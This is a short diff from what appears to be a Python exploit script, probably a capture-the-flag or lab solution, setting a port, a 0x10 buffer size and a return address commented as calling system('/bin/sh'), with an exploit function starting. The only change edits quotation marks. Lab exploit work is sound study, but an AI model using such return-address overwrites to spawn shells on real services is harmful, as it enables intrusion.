@@ -5,7 +5,7 @@ port = 65534
 
 bufferSize = 0x10
 
-# address of calling system('/bin/sh')
+# address of calling system("/bin/sh")
 ret = 0x401195
 
 def exploit(s):
